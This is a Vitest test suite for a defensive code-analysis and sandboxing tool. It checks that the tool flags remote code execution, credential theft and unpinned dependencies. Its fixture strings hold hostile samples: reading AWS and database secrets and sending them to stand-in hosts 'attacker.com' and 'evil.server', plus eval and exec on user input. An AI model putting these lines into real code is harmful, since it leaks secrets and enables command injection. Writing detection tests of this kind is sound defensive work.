import { describe, it, expect } from 'vitest';
import {
  analyzeCveAst,
  calculateShannonEntropy,
  detonateSandbox,
  traceTaintFlow,
  generateHotpatch
} from '../src/webmcp/breachlab.ts';

describe('Sentinel BreachLab Engine (Module 1)', () => {
  it('calculates Shannon entropy correctly for high vs low randomness', () => {
    const lowEntropy = calculateShannonEntropy('aaaaaaabbbbbbb');
    const highEntropy = calculateShannonEntropy('8x!9qZ#L0@vN1%kP');
    expect(lowEntropy).toBeLessThan(highEntropy);
  });

  it('detects critical RCE and credential theft vulnerabilities in code', () => {
    const maliciousCode = `
      const userInput = req.query.cmd;
      const key = process.env.AWS_SECRET_ACCESS_KEY;
      fetch("https://attacker.com/steal?k=" + key);
      eval(userInput);
      child_process.exec(userInput);
    `;
    const result = analyzeCveAst(maliciousCode);
    expect(result.threatScore).toBeGreaterThanOrEqual(70);
    expect(result.verdict).toBe('CRITICAL_ZERO_DAY');
    expect(result.findings.some(f => f.type === 'RCE')).toBe(true);
    expect(result.findings.some(f => f.type === 'CREDENTIAL_EXFIL')).toBe(true);
    expect(result.graph.nodes.length).toBeGreaterThan(1);
  });

  it('detects unpinned dependencies and malicious supply chain packages in package.json', () => {
    const pkgJson = JSON.stringify({
      name: 'vulnerable-service',
      dependencies: {
        'express': '*',
        'event-stream-flat': '1.0.0',
        'lodash': '^4.17.21'
      }
    }, null, 2);

    const result = analyzeCveAst(pkgJson);
    expect(result.findings.some(f => f.type === 'UNPINNED_DEP')).toBe(true);
    expect(result.findings.some(f => f.type === 'CREDENTIAL_EXFIL')).toBe(true);
  });

  it('detonates malicious code in isolated simulated sandbox and catches threats', () => {
    const exploit = `
      const secret = process.env.DATABASE_URL;
      fetch('https://evil.server/log', { method: 'POST', body: secret });
      eval("console.log('pwned')");
    `;
    const detonation = detonateSandbox(exploit);
    expect(detonation.success).toBe(true);
    expect(detonation.safeToRun).toBe(false);
    expect(detonation.quarantinedThreats).toContain('BLOCKED_NETWORK_EXFILTRATION');
    expect(detonation.quarantinedThreats).toContain('BLOCKED_DYNAMIC_EVAL');
    expect(detonation.interceptedEvents.length).toBeGreaterThan(0);
  });

  it('enforces the configured sandbox timeout and stops scanning early', () => {
    const hugeCode = Array.from({ length: 50_000 }, (_, i) => `console.log(${i});`).join('\n');
    const detonation = detonateSandbox(hugeCode, { timeoutMs: 1 });
    expect(detonation.timedOut).toBe(true);
    expect(detonation.success).toBe(false);
    expect(detonation.safeToRun).toBe(false);
  });

  it('completes normally when no timeout is configured', () => {
    const detonation = detonateSandbox('console.log("ok");');
    expect(detonation.timedOut).toBe(false);
    expect(detonation.success).toBe(true);
  });

  it('traces tainted user input propagation to vulnerable sinks', () => {
    const code = `
      const payload = req.query.cmd;
      const sanitized = payload;
      eval(sanitized);
    `;
    const trace = traceTaintFlow(code);
    expect(trace.isVulnerable).toBe(true);
    expect(trace.taintedVariables).toContain('payload');
    expect(trace.taintTrace.some(t => t.type === 'SOURCE')).toBe(true);
    expect(trace.taintTrace.some(t => t.type === 'SINK')).toBe(true);
  });

  it('generates hotpatches that neutralize dangerous sinks and improve security score', () => {
    const vulnerableCode = `
      const data = eval(jsonString);
      child_process.exec(data);
    `;
    const patch = generateHotpatch(vulnerableCode);
    expect(patch.diff.length).toBeGreaterThan(0);
    expect(patch.patchedCode).not.toContain('eval(');
    expect(patch.securityScoreImprovement).toBeGreaterThan(0);
    expect(patch.fixesApplied.length).toBeGreaterThan(0);
  });
});
